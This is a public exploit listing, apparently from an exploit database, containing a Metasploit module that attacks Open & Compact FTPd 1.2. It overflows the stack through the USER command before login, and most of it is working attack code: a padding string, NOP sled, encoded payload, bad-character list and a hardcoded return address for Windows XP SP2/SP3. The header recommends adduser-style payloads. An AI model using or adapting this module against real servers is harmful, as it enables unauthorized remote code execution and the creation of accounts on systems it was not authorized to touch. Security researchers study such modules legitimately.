Open & Compact FTPd 1.2 Pre-Authentication Buffer Overflow (meta)
=================================================================

# Exploit Title: Open & Compact FTPd 1.2 Pre-Authentication Buffer Overflow MSF
# Date: March 14, 2010
# Author: Blake
# Software Link: http://sourceforge.net/projects/open-ftpd/files/open-ftpd/binairies.1.2/open-ftpd.1.2.tar.gz/download
# Version: 1.2
# Tested on: XP SP3
 
Exploit causes the ftp server to crash so adduser, etc. payloads are most effective.
 
 
 
require &#039;msf/core&#039;
 
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = AverageRanking
 
    include Msf::Exploit::Remote::Ftp
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Open & Compact FTPd 1.2 Pre-Authentication Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                This module exploits a stack overflow in the USER verb in Open & Compact FTPd version 1.2. The program will crash once the payload is sent, so bind shell payloads are not effective.
 
            },
            &#039;Author&#039;         => &#039;Blake&#039;,
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;Version 1&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;EDB-ID&#039;, &#039;11420&#039;],
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/11420&#039; ],
                ],
            &#039;Privileged&#039;     => true,
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 400,
                    &#039;BadChars&#039; => "\x00\x20\x0a\x0d",
                    &#039;StackAdjustment&#039; => -3500,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Windows XP SP2/SP3 English&#039;,       { &#039;Ret&#039; => 0x00202c42 } ],
 
                ],
            &#039;DisclosureDate&#039; => &#039;Feb 12, 2010&#039;,
            &#039;DefaultTarget&#039;  => 0))
    end
 
 
    def exploit
        connect
 
        sploit =  "\x42\x2c\x20" * 199
        sploit << make_nops(10)
        sploit << payload.encoded
 
        print_status("Trying target #{target.name<http://target.name>}...")
 
        login = "USER #{sploit}\r\n"
        login << "PASS " + rand_text_alphanumeric(12)
 
        sock.put(login + "\r\n")
 
        handler
        disconnect
    end
 
end



